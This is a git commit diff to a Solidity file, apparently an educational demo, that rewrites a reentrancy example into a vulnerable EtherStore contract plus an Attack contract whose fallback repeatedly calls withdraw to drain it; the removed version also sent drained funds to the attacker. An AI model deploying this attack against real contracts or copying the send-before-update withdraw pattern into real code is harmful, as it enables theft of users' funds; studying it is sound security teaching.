b7c46ed8479c58e4c06aef8eab24648466fa0cf4
Liz Durán <42351387+liiz-durang@users.noreply.github.com>
2022-08-24 14:10:08 -0500

    reentrancy

--- reentrancy.sol
+++ reentrancy.sol
@@ -1,9 +1,9 @@
-//"SPDX-License-Identifier: UNLICENSED"
-pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
 
-contract DepositFunds{
+contract EtherStore {
     mapping(address => uint) public balances;
-    
+
     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
@@ -11,47 +11,41 @@ contract DepositFunds{
     function withdraw() public {
         uint bal = balances[msg.sender];
         require(bal > 0);
+
         (bool sent, ) = msg.sender.call{value: bal}("");
-        if(sent) {
-        bal;
-      }
+        require(sent, "Failed to send Ether");
+
         balances[msg.sender] = 0;
     }
 
-    function getTotalBalance () public view returns(uint256) {
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
         return address(this).balance;
     }
 }
 
 contract Attack {
-    DepositFunds public depositFunds;
-    address payable owner;
-    constructor(address _depositFundsAddress) {
-        depositFunds = DepositFunds(_depositFundsAddress);
-        owner = payable(msg.sender);
-        
+    EtherStore public etherStore;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
     }
 
-    // Fallback is called when DepositFunds sends wei to this contract.
+    // Fallback is called when EtherStore sends Ether to this contract.
     fallback() external payable {
-        if (address(depositFunds).balance >= 1 wei) {
-            depositFunds.withdraw();
+        if (address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw();
         }
     }
 
     function attack() external payable {
-        require(msg.value >= 1 wei, "Enviar mas valor");
-        depositFunds.deposit{value: msg.value}();
-        depositFunds.withdraw();
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
     }
 
-    function getTotalBalance () public view returns(uint256) {
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
         return address(this).balance;
     }
-
-    function cashOut () public payable{
-        uint256 balance =getTotalBalance();
-        owner.transfer(balance);
-    }
-
 }
